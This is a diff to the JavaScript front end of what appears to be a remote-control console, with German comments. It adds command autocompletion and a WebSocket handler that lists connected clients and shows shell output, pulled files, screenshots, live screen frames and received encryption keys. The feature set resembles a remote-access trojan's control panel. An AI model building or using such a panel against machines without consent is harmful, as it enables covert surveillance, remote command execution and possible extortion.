@@ -618,7 +618,7 @@
       }
     }
 
-    // --- Slash-Befehle erweitern um /cd, /encrypt und /decrypt ---
+    // --- Slash-Befehle für Suggestion ---
     const COMMANDS = [
       { cmd: "/help", desc: "Zeigt die Hilfe an" },
       { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
@@ -637,6 +637,85 @@
       { cmd: "/screenstream_start", desc: "Live-Screen starten" },
       { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
     ];
+
+    // --- Slash-Befehl Suggestion ---
+    let suggestIdx = 0;
+    function showSuggest() {
+      const val = commandInput.value;
+      if (!val.startsWith("/")) {
+        commandSuggest.style.display = "none";
+        return;
+      }
+      const query = val.slice(1).toLowerCase();
+      const filtered = COMMANDS.filter(c => c.cmd.slice(1).startsWith(query));
+      if (filtered.length === 0) {
+        commandSuggest.style.display = "none";
+        return;
+      }
+      commandSuggest.innerHTML = "";
+      filtered.forEach((cmd, idx) => {
+        const item = document.createElement("div");
+        item.className = "suggest-item" + (idx === suggestIdx ? " selected" : "");
+        item.setAttribute("role", "option");
+        item.innerHTML = `<span style="font-weight:600;min-width:110px">${cmd.cmd}</span>
+          <span class="suggest-desc">${cmd.desc}</span>`;
+        item.onmousedown = (e) => {
+          e.preventDefault();
+          commandInput.value = cmd.cmd + " ";
+          commandInput.focus();
+          hideSuggest();
+        };
+        item.onmouseenter = () => {
+          suggestIdx = idx;
+          updateSuggestHighlight();
+        };
+        commandSuggest.appendChild(item);
+      });
+      commandSuggest.style.display = "block";
+    }
+    function hideSuggest() {
+      commandSuggest.style.display = "none";
+      suggestIdx = 0;
+    }
+    function updateSuggestHighlight() {
+      Array.from(commandSuggest.children).forEach((el, idx) => {
+        el.classList.toggle("selected", idx === suggestIdx);
+      });
+    }
+    commandInput.addEventListener("input", showSuggest);
+    commandInput.addEventListener("focus", showSuggest);
+    commandInput.addEventListener("blur", () => setTimeout(hideSuggest, 120));
+    commandInput.addEventListener("keydown", (e) => {
+      if (commandSuggest.style.display === "block") {
+        const val = commandInput.value;
+        const filtered = COMMANDS.filter(c => c.cmd.slice(1).startsWith(val.slice(1).toLowerCase()));
+        if (e.key === "ArrowDown") {
+          suggestIdx = Math.min(suggestIdx + 1, filtered.length - 1);
+          updateSuggestHighlight();
+          e.preventDefault();
+        } else if (e.key === "ArrowUp") {
+          suggestIdx = Math.max(suggestIdx - 1, 0);
+          updateSuggestHighlight();
+          e.preventDefault();
+        } else if (e.key === "Tab") {
+          if (filtered[suggestIdx]) {
+            commandInput.value = filtered[suggestIdx].cmd + " ";
+            commandInput.focus();
+            hideSuggest();
+            e.preventDefault();
+          }
+        } else if (e.key === "Enter") {
+          if (filtered[suggestIdx]) {
+            commandInput.value = filtered[suggestIdx].cmd + " ";
+            commandInput.focus();
+            hideSuggest();
+            e.preventDefault();
+          }
+        } else if (e.key === "Escape") {
+          hideSuggest();
+        }
+      }
+    });
 
     // --- parseSlashCommand anpassen für encrypt/decrypt ---
     function parseSlashCommand(cmdText) {
@@ -679,7 +758,102 @@
           return { action };
       }
     }
-    // ...existing code...
+
+    // --- WebSocket Initialisierung ---
+    const ws = new WebSocket(
+      (location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws"
+    );
+
+    ws.onopen = () => {
+      log("WebSocket verbunden.", "info");
+      debugLog("WebSocket verbunden", "info");
+    };
+
+    ws.onclose = () => {
+      log("WebSocket getrennt.", "error");
+      debugLog("WebSocket getrennt", "warn");
+    };
+
+    ws.onerror = (e) => {
+      log("WebSocket Fehler.", "error");
+      debugLog("WebSocket Fehler: " + e, "error");
+    };
+
+    ws.onmessage = (event) => {
+      let data;
+      try {
+        data = JSON.parse(event.data);
+      } catch (e) {
+        debugLog("Fehler beim Parsen der Nachricht: " + e, "error");
+        return;
+      }
+      if (data.type === "client_list") {
+        renderClientList(data.clients || []);
+      } else if (data.type === "client_connected" || data.type === "client_disconnected") {
+        ws.send(JSON.stringify({ action: "get_clients" }));
+      } else if (data.type === "command_output") {
+        log(data.output || "Kein Output.", "info");
+      } else if (data.type === "file_download") {
+        // Datei-Download
+        const blob = b64toBlob(data.data, "application/octet-stream");
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = data.filename || "download.bin";
+        a.click();
+        log("Datei-Download gestartet: " + (data.filename || ""), "info");
+      } else if (data.type === "screenshot") {
+        // Screenshot anzeigen
+        const img = document.createElement("img");
+        img.src = "data:image/png;base64," + data.data;
+        img.style.maxWidth = "100%";
+        output.appendChild(img);
+        log("Screenshot empfangen.", "info");
+      } else if (data.action === "screen_frame") {
+        // Live-Screen-Frame empfangen
+        if (liveScreenArea) liveScreenArea.style.display = "";
+        if (screenCanvas) {
+          const ctx = screenCanvas.getContext("2d");
+          const img = new window.Image();
+          img.onload = function () {
+            screenCanvas.width = data.width;
+            screenCanvas.height = data.height;
+            ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+            ctx.drawImage(img, 0, 0, data.width, data.height);
+          };
+          img.src = "data:image/jpeg;base64," + data.img_bytes;
+        }
+        if (screenStatus) screenStatus.textContent = "Live-Bild";
+      } else if (data.type === "encryption_key") {
+        log("Verschlüsselungs-Schlüssel empfangen: " + data.key_hex, "info");
+      } else if (data.type === "error") {
+        log(data.message || data.error || "Fehler", "error");
+      } else if (data.type === "debug") {
+        debugLog(data.msg, data.level || "info");
+      }
+    };
+
+    function b64toBlob(b64Data, contentType = "", sliceSize = 512) {
+      const byteCharacters = atob(b64Data);
+      const byteArrays = [];
+      for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+        const slice = byteCharacters.slice(offset, offset + sliceSize);
+        const byteNumbers = new Array(slice.length);
+        for (let i = 0; i < slice.length; i++) {
+          byteNumbers[i] = slice.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        byteArrays.push(byteArray);
+      }
+      return new Blob(byteArrays, { type: contentType });
+    }
+
+    // --- Senden-Button ---
+    sendButton.onclick = () => sendCommand();
+    commandInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" && !e.shiftKey) {
+        sendCommand();
+      }
+    });
   </script>
 </body>
 </html>
